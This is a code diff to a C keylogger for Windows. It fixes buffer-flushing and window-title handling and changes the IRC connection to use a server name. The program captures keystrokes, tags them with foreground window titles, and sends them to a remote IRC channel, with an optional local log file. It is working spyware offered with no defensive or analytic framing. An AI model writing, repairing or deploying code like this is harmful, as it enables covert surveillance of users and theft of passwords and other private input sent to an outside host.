@@ -37,17 +37,19 @@ void clear_buffer() {
 
 void output_charbuf() {
 	char* i;
-	for(i=current_char;i<(charbuf+sizeof(charbuf));i++)
+	for(i=current_char+1;i<(charbuf+sizeof(charbuf));i++)
 		*(i)=0;
 	current_char=charbuf;
 	if(LOG&LOG_IRC)
 		irc_send(IRC_CHANNEL, charbuf);
+	if(LOG&LOG_FILE)
+		fflush(logfile);
 }
 
 void advance_charbuf() {
-	if(current_char>=charbuf+sizeof(charbuf)-2) {
+	if((current_char>=charbuf+sizeof(charbuf)-2)||(*current_char=='\n'))
 		output_charbuf();
-	} else if(*current_char!='\n')
+	else
 		current_char++;
 }
 
@@ -57,7 +59,7 @@ int main() {
 	if(LOG&LOG_FILE)
 		logfile=fopen(buf, "w");
 	if(LOG&LOG_IRC) {
-		irc_connect(IRC_IP, IRC_PORT, IRC_NICK);
+		irc_connect(IRC_SERVER, IRC_PORT, IRC_NICK);
 		irc_join(IRC_CHANNEL, IRC_KEY);
 	}
 	log_msg("***Starting keylogger");
@@ -69,7 +71,7 @@ int main() {
 		last_win=current_win;
 		current_win=GetForegroundWindow();
 		if(current_win!=NULL) {
-			GetWindowText(current_win, current_title, 256);
+			GetWindowText(current_win, current_title, sizeof(current_title));
 			if(current_win==last_win&&strcmp(last_title, current_title)) {
 				output_charbuf();
 				sprintf(buf, "***Window caption change [%s]", current_title);
@@ -115,7 +117,6 @@ int main() {
 
 		if(GetAsyncKeyState(VK_ESCAPE)&&ESCAPE_EXITS)
 			break;
-		fflush(logfile);
 		sleep(1);
 	}
 	output_charbuf();
